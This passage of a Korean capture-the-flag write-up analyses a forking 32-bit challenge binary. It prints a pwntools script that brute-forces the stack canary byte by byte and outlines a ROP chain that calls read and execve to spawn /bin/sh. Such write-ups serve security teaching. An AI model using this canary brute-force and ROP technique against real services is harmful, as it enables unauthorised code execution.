+<h2 id="sub_8048e7e-next_read-함수-분석" style="position:relative;"><a href="#sub_8048e7e-next_read-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D" aria-label="sub_8048e7e next_read 함수 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>sub_8048E7E [next_read] 함수 분석</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 475px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 99.44444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsTAAALEwEAmpwYAAACEUlEQVQ4y5VTW47TQBD0P//cgiPAaRCH4HB8IEACARL7SNiQzSZOYsf2PD125tndaEK0u7AsCqXSqDSj8rSr7OL9xxfL7ZvrEr+er64WYjpn03n35az8/O3mbGIuv7+ezl9OfvhFOZnMnk/n7y5n/XpnN43fNL5Yr8+JriFZIiQCIoQUEdNBE1FHVB+EJyqJLN1D0bbXWj/rzSchXNu2SjmtSWsSMh8jHlfAOw/ikQXrzlerp7vdh+02cA5aI+fEGNU19T11HXKOjOWdw2i/oeD8TMonWr9tGscYaE1tm7ndklJZdF1eD+Y/UQi+GsdX436qVDAGrSUpSYjsHMcspMwjOPc3s5Qxp+EpJURE5/DheI+h4Dwyhl0HnEelohApJbgfFT7+qEKIuN+TMa4sxxCA/gdF2/qyHGYzvtko78mYmBLkbuDuzofiaK5rW1VaKet9CoFCSABw+juHlNBaDCFZS8tlzrZpaDYLda2tpWFI4wjDAM4RY+5XIkez1sm5dHOj+t7vdrReu8ViWC4tY8kYHyN5DyGg9xAjDUOEe9/asSrO09UVNY2vKqW1BQA8oa9CqWyWEqtqz1gSwqd0cs9KRQDiHIXAvo/GJCHiiZkVUgYAGgYaBq8U9H18WMmj5q7zWtsYISUEoBAoRrz96f7Nom1dVenFQhjjjck9aX1wn3LzxYXe71HrpFS8pZQn8Scms4RQsZ9PugAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./11.png"
+        title="./11.png"
+        src="/static/e0aeb0e45220599df0c1ea09acbb1147/466da/11.png"
+        srcset="/static/e0aeb0e45220599df0c1ea09acbb1147/e9ff0/11.png 180w,
+/static/e0aeb0e45220599df0c1ea09acbb1147/f21e7/11.png 360w,
+/static/e0aeb0e45220599df0c1ea09acbb1147/466da/11.png 475w"
+        sizes="(max-width: 475px) 100vw, 475px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>sub_8048E7E 함수</p>
+<ul>
+<li><code class="language-text">read_byte</code> 함수의 반환 값을 a2 인자로 받고, a1의 인자는 전역 변수 v3를 받는다.</li>
+<li>read 함수를 바탕으로 전역 변수 v3의 버퍼 공간을 사용자의 입력값 즉 바이트를 길이 값으로 매개체 삼아 버퍼 공간을 채우는 사실을 알 수 있다.</li>
+<li>전역 v3의 버퍼 공간 32바이트를 넘어서는 값의 길이 검증이 없기 때문에 255 바이트까지 입력을 받을 수 있어  충분히 오버플로우가 가능한 것으로 보이지만 문제는 SSP 보호 기법으로 인해 일반적인 오버플로우가 불가능하다.</li>
+</ul>
+<h2 id="canary-분석" style="position:relative;"><a href="#canary-%EB%B6%84%EC%84%9D" aria-label="canary 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>canary 분석</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACIklEQVQoz02QSW/TUBhF8z9okzSTp2c79vOYeIznxCGtU0orhAoVG8T/X/H6XYQXiMXRle7i6uhOEr/CqXuAvysQJQ1Ma4f5QsN8ocBwWuRphzZNYfADZN2FpsdQ9QjMzcHcCncyx1yyMJNszCUbkzw54nn4DM/00BUdzvUZOx6Sw2zwoKZmd6RKKsizXVJ1RrMNo5vlmj4sVLrZMJrK+tjNVgpNlxuaePsKx8sAZnlIy3aEBzGY5RAPapR1A9cxoDENnCkwTQWapUCxGSTThsYsyMzEWlMx26iY+HGNj9cnGLaPKK9QHy+I85okZsBwmvc4jkWbaIIHnpDDWOhpJ6ykFFYYC7bNhCw5Yi1bYqFuxUzxxH+GLtKyQ9H22GcVGY4Pa5u9Z7vut2EfRFIOYusWYqn4IszOQtJjwdxC+Fkv7mRXOPtOGE4qJn5Uo394hGpyJEWL+nRBEOVYqwZ5UTvaa6aF0/2A+tRDNS18+fYG7geI8wLPX1+hqDp+/fiJ748vGAcv1yeYPEBWHVG2PaKsItvbwQ0b6u8fSTFsOl6u1PQXktiWXl7fyAkj4kFE7fmBVrJOp/NAaVbSJI1aXO8/gW89lIcWl/6KNDrAtTx4PEeZlgjjHM15GO8weIAgPkDSTEyXEmYreczbpYTpSsIkjTsMwxNcZ4cwSGBbHjYrFauFDM85oEgrqG6N1TaBE0Q4ND1Uw8btYvNv7G+OLGX8AfRdKnS5QDrtAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./12.png"
+        title="./12.png"
+        src="/static/d409dfd5dfc9ee807ee2c314a9b22ce1/37523/12.png"
+        srcset="/static/d409dfd5dfc9ee807ee2c314a9b22ce1/e9ff0/12.png 180w,
+/static/d409dfd5dfc9ee807ee2c314a9b22ce1/f21e7/12.png 360w,
+/static/d409dfd5dfc9ee807ee2c314a9b22ce1/37523/12.png 720w,
+/static/d409dfd5dfc9ee807ee2c314a9b22ce1/302a4/12.png 1080w,
+/static/d409dfd5dfc9ee807ee2c314a9b22ce1/76a99/12.png 1117w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>카나리</p>
+<ul>
+<li>gdb를 바탕으로 카나리를  <code class="language-text">gs:0x14</code>  가져와 스택상에 넣는 과정을 확인할 수 있다.</li>
+<li>중요한 사실은 32bit 카나리인 경우 값이 총 4바이트이며 상위 1 바이트가 무조건 널 바이트인 것을 확인할 수 있다.</li>
+<li>전역 변수 <code class="language-text">v3</code> 과 카나리의 값은 각각 .bss 영역에 있고 32바이트 차이가 나기 떄문에 오버플로우를 발생시켜 카나리의 값을 임의로 변조시켜 brute-force를 통해 한 바이트씩 카나리의 값을 총 3 바이트를 알아낼 수 있다.</li>
+</ul>
+<h2 id="fork-분석" style="position:relative;"><a href="#fork-%EB%B6%84%EC%84%9D" aria-label="fork 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fork 분석</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 67.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABwklEQVQoz2WSW3IiMQxF2f+q5ndWMFNJBhJoTGP6JT9lS7KmGhKSEJVLP/LVPZa8sdYfDmPfg3PsPYew5tt5fXXGwOUSnSMAeqh6z5u3t6nv0+mUhoEBFFGJtDVV1WHIu93UdWBMHAe5VZn1Hpv9fjydUtflvq/W8rKo95qzlqJ9n7b/7PEYh6mNk14GnedVf2u9ilOiUlikIXKtItLujcGxz4xFaAzFQnX4pXgVe18BeJ55njFnYr7Wr2kyAf72aWv87+fh15/8el6R22eDTYw8DM1a9V70e7gR4xGWzo17jzYo1ocLG+dkt6X9gU7TMqUJEHzxGYmopcyLa3tTewcLAVTni8vIRPL55mWhlFotgsjMckfznmOoABSCFmwZqdRv4Cv2+SxHgyFjSLlU+sRe18t2KMb6kNeJ3D3fxQDt5UUPx7JEKIKVWD8ax0jzpOdLTBSqVHmY9dWZUpKUKglLE2l8pwKoMVJGDqlIk3WfP1alT0/6dijWDaEGj2E1/+J8tG7OYyg+YHww3xjTnp90bxzgkmpmavrB7Rx3nWwP3lzmXLA9Uq/TXv9jSrwCa2MWoveZzXMtpdWqpXL7KVX9Dwk9K56fT7O2AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./13.png"
+        title="./13.png"
+        src="/static/4673a9941ac072aa90d2fbdbdbb47ef4/37523/13.png"
+        srcset="/static/4673a9941ac072aa90d2fbdbdbb47ef4/e9ff0/13.png 180w,
+/static/4673a9941ac072aa90d2fbdbdbb47ef4/f21e7/13.png 360w,
+/static/4673a9941ac072aa90d2fbdbdbb47ef4/37523/13.png 720w,
+/static/4673a9941ac072aa90d2fbdbdbb47ef4/f1d1f/13.png 739w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>frok 분석</p>
+<ul>
+<li>문제는 총 반복을 <code class="language-text">0x31F</code> 를 반복하면서 <code class="language-text">fork</code> 함수를 바탕으로 자식 프로세스를 생성하고 내부 로직이 끝나면 죽이고 생성하는 과정을 반복한다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 78.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEwklEQVQ4y0WTWVCTVxTHjwmtxajgjAuWdlAr0gcMfh8gNWwuRadqsZuFIqi1D860D+3UgttUrKTtCCKLyCokgYRAEAiERQgkKAMkkKWEEHaJKAiiAqJC+JKczhe7PNw59+X+5nfP+R8gvb3AD2BV0Lq1nFAWy5uzehUZunLl9hCX1SQB4Ewsfwv83lkOBMcPiJ07YPvuXRDgy4aPAVYGu60P4axfGxTi5PRh6BpX3wMAa8DXfYMbO50b5F6QnOFelH51iygj5V1B6jV33vVUsjRnKyHOAm9R5jIHMIAAn9271gZu3ezmWZJ1fAM/Jc2jKP26hzjz6saC5BubhDd+hO0ALqQkLyGxV4N8kx6T2hVY1N+NXIMKvcrzT3iW50NQbTGTBpLubrD/YJgLuLzt9nmztE8w3IsZ2jZM7byHwiEjnu6QPweflCvAruKfqX90Hx89m15Q9uiXHs88Xyg3D6JHafaxjeKbEFzJZ/qGBiwjjx5mAABg219w/G6tanR+FnUjQ4vqwT7LxPwcXtK3jUCUWg5hdyRx6icTuGCzUqYXM/Ylu41qeTyGvtWF0X41IjjxSMvwIdjgs80TENFxznQqu+Ysi/hw4aXV/Gre9tpKYVaf3gzft8vhSFNF3NjLOUREapFastN1YPYZBsqEMaGCVNi5e+/qHf5EyA5/IiAp6uRyGpigb9fQD9But1ptVht9rTAPmuGoogr23SmNU/1jaJx77jBUTjxAoqow6lzbNysOl/1K7uOe2rc3/uQnX1VcOgAAzJ/Vys5ZyyKOvX5pHX31wvaaojCTNmRL+cCu5MXRPeubmqCUA7324adPKOGICTdJcqKhqAQOK9JYCYjMy4jMOF3eCtrwWEtNV8/MNHbcH7K2DvXZhmaf4XnNPTP4VxcCKRXEFQ73Yqt5mOK3t9jpmjdowK1ludGeZVnAEiGcoG5DPKoBzr3pY6Syuqt1ahylBq1VqLpnU02N4y+dLWbwrxcDKeXHSkYHUDc+RpWoWu3G6UmKjsQHZbnRHpIc2FMnZIZXx0NwfTYNW/avoebpJDaYDNYag9ZmeDr1xtA3NxmIKkFsyWg/dk+OWyp0apvxyWMLf9j4HzC0TuzIIXEtHhyxmUeIapF10kDFoGmprkdPGWem8WxXyyi8D8Agy/MvJBm7sHigBxNb5SgZNuHv3XSwb8V43s77P9gAEP7ZIRYAOH/RXNlN9zlb14FpqrtI//B0W8MkkNs2b/ROS9rEEmZGOglSI1dJciIZvJRIJ15KBFtW6UrKJOBVUeTYZZLjB+w9HJdAzy3r3ivl7XTipcY4i25GsEqyIyD/WjSrMGMPcBKiYL/sbMB+WWxxhPxKwXfKRF5kU0LBKWWi6NPqi8ShqvMQLrvo2OWPvg4DVwAI5h6DsKrYnw7WnhMfb/4zP6b5j4KoZm7Rt4qryZA9IoczbbcuFGhqUaxtRJGmAQUdNSjUNeJ5teCHNKMMbhpkTCLQH47q0sCgVDPooXBVxf0iXSMWaxtRoKrFUo0cs7TVCILBZriiKT4p0TehVKewVOoVVJm60SLWNSJXV/Jlbv8dyDc1MMJrLsOR2t/ggfkBY/LhOGRopfVSnRKleuViubZpqaKrCW9payb+BimOzqLFV1s1AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./14.png"
+        title="./14.png"
+        src="/static/0984e284d6785593f7350f4e9f279057/37523/14.png"
+        srcset="/static/0984e284d6785593f7350f4e9f279057/e9ff0/14.png 180w,
+/static/0984e284d6785593f7350f4e9f279057/f21e7/14.png 360w,
+/static/0984e284d6785593f7350f4e9f279057/37523/14.png 720w,
+/static/0984e284d6785593f7350f4e9f279057/6c745/14.png 893w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>fork 과정</p>
+<ul>
+<li>fork 함수를 바탕으로 부모 프로세스의 메모리 사이즈, 값을 그대로 복제하여 자식 프로세스를 생성한다.</li>
+<li>부모 프로세스가 수행하던 코드 영역까지 그대로 복사를 하며 호출 이후에 부모 영역, 자식 영역이 따로 생기는 것을 알 수 있으며 canary의 값 또한 그대로 복제가 되는 것을 확인할 수 있겠다.</li>
+<li>그렇다면은 반복을 돌면서 자식 프로세스가 생겨나도 brute-force 기법을 바탕으로 1 바이트씩 해당 카나리 값을 구할 수 있겠다.</li>
+</ul>
+<h1 id="해결-방안" style="position:relative;"><a href="#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88" aria-label="해결 방안 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>해결 방안</h1>
+<h2 id="공격" style="position:relative;"><a href="#%EA%B3%B5%EA%B2%A9" aria-label="공격 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>공격</h2>
+<h2 id="canary-brute-force" style="position:relative;"><a href="#canary-brute-force" aria-label="canary brute force permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>canary brute-force</h2>
+<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">canary <span class="token operator">=</span> <span class="token string">'\x00'</span>
+buf <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x20</span>
+
+<span class="token keyword">def</span> <span class="token function">get_canary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> canary
+    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"byte_%d"</span><span class="token operator">%</span>_<span class="token punctuation">)</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"FEED ME!\n"</span><span class="token punctuation">)</span>
+            len_byte <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
+            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>len_byte<span class="token punctuation">)</span><span class="token operator">+</span>buf <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            res <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Child exit.\n'</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'YUM'</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+                canary <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+                log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary: "</span><span class="token operator">+</span>canary<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+    <span class="token keyword">print</span> hexdump<span class="token punctuation">(</span>canary<span class="token punctuation">)</span></code></pre></div>
+<ul>
+<li>널 바이트는 알기 때문에 하위 3바이트를 기점으로 잡아 한 바이트 별로 <code class="language-text">0xFF</code> 번 돌면서 값을 알아낼 수 가 있으며 앞에서 <code class="language-text">feedme</code> 함수가 제대로 반환이 되어 <code class="language-text">YUM</code> 문자열이 출력이 되었더라면 카나리값과 동일하다는 것을 확인할 수 있고 그와 반대로는 계속해서 루틴을 돌면서 찾게 될 것이다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7ElEQVQY04XPTW6DMBAFYB+kmGCPf2MTXAigQolD7QShqkmrrLro/Y9RIXWRKo0qfYvR03uLQS/Tx/5wHuLJx3PzFOJ88eHNx1OcL0yXGdsseEF48XMvihUYkAN6HoOr2uBD3++qbqc35dpVxlVUakx5CuIvElMgokb9PhLC+tzW1lZMUsIfCE8Ix3Qp3aEwZUQ0qPOjtk5bK7WumFIg8d3NzdjH6bHulHFJxjEoDCr93/IRES3yYXTbZtsNK8YxpbdSgBRYCnAVQkLSjJcoxK88f7XtpzAzk4Gp+IuMYn2U5ijNdJUfQI7SvH8DM6xHbpI6+5IAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./15.png"
+        title="./15.png"
+        src="/static/d77afbaa9bcff8755d7b40e8ba15e892/37523/15.png"
+        srcset="/static/d77afbaa9bcff8755d7b40e8ba15e892/e9ff0/15.png 180w,
+/static/d77afbaa9bcff8755d7b40e8ba15e892/f21e7/15.png 360w,
+/static/d77afbaa9bcff8755d7b40e8ba15e892/37523/15.png 720w,
+/static/d77afbaa9bcff8755d7b40e8ba15e892/c946b/15.png 805w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>카나리 값 릭</p>
+<h2 id="rop-sceanario" style="position:relative;"><a href="#rop-sceanario" aria-label="rop sceanario permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP sceanario</h2>
+<ul>
+<li>NX 보호기법이 켜져 있기 때문에 메모리에서의 실행은 불가능하다 그렇기 때문에 ROP 해서 우회를 해야 하며 기본적으로 오버플로우를 발생 시켜 리턴 주소에 ROP 가젯을 집어넣어 EIP 조작을 진행해야 한다.</li>
+<li>라이브러리가 정적 링킹되어 있기 때문에 공유 라이브러리 상에서 필요한 함수를 가져올 수 가 없기 때문에 ROP를 바탕으로 SYS_CALL을 진행하여 exploit을 시도해야 한다.</li>
+</ul>
+<h2 id="rop시-필요한-sys_call" style="position:relative;"><a href="#rop%EC%8B%9C-%ED%95%84%EC%9A%94%ED%95%9C-sys_call" aria-label="rop시 필요한 sys_call permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP시 필요한 SYS_CALL</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 44.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACsElEQVQozzWLXUiTcRyFf9FFJBRvN3kV3RTRRaSYUbzYyixbZJlUdBFREZmR0V1QXUiRprSVizA/ynKZWm3O17BtTp2p/zbHlqy59sk+/NzmhMroj2kntuhcnefhHMrKkxWuzJKvw20iIqxYDZAWIMpAitN9I0CH8I9pAlQO0KUU/3cAyYEV2VIb0e639z+fMKrYKVPdSLHhEdvRqWS5mrvsyAcFO6qvZTs1FWm3W1vBig0qli/dY7naKpajrWF7u+6ykt4nLE93ZyRHq7BmdamfUr1rACYfw/uvw+jxDKF6zIR2/zD6QqMwBCzoCVtR5TBCH7bCGLRiIGJDo9uMR84+9Edt0Ps+YSBqQ6XDiK3a56CP05PL8/HkUnhqGsm5eaj9bkQXfiKZmMfE1Az4MvDS60IqwUgUy3wJtkQcUiQI/AbcgSDwB3gd9GDT24YZkjUqiy7oWuWXhvV5pZ96xWxNk3hAahFLmVEss5hEuaQWczqfiyU97eKV0X7xbH+XuE9qEXdon4lnTJ1iuX1QPG18J+7SNedt073YQFuOHSxec2DnfjpfkEk3i9ZmttULq1prBbpxTKAbxwVSK4T1HQ0CNd0R6HqhQIpyIaO1Vsh80ySQ8ppAV/MFqrslrO94uu7myCBRof7x9zLW/P3yUPOv8+Z6LutW8QKpmp8bqOMXzA38YHdV2h1+f59fHGziJw1Knt+t4DLpIS/RP+ClQ828uKfm1x6pdnG7ruUzGUIuBCJeOENueKNetAXG4ExGEY6F4ZnyY2ohjlc+O2YW4vBM+hH7NgvztA9dYRcSP2LpXzK18TuwRfMM9MLjXBwNBbk54OWWUJBXjll472SEW8Mh/jHg4/ZEjN9zMO5KzvE+71c+HpvlHUEPV7ns3JNIcP34F+5LJnmNc3Rp87vGkb8RH9JClSuOnAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./16.png"
+        title="./16.png"
+        src="/static/94e1e9d90ac26ed0c210754be0fae5f1/37523/16.png"
+        srcset="/static/94e1e9d90ac26ed0c210754be0fae5f1/e9ff0/16.png 180w,
+/static/94e1e9d90ac26ed0c210754be0fae5f1/f21e7/16.png 360w,
+/static/94e1e9d90ac26ed0c210754be0fae5f1/37523/16.png 720w,
+/static/94e1e9d90ac26ed0c210754be0fae5f1/798d4/16.png 976w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>syscall</p>
+<ul>
+<li><code class="language-text">/bin/sh</code> 문자열이 존재하지 않기 때문에 ROP를 바탕으로 read 함수로 입력을 받을 것이며 입력을 받게 되는데 NX 보호 기법을 우회하기 위해 <code class="language-text">.bss</code> 섹션의 첫 번째 주소 부분에 데이터를 삽입할 것이다.</li>
+<li>마지막으로 execve syscall을 바탕으로 <code class="language-text">.bss</code> 섹션에 존재하는 <code class="language-text">/bin/sh</code> 문자열을 실행하게 된다면은 쉘을 딸 수 있겠다.</li>
+</ul>
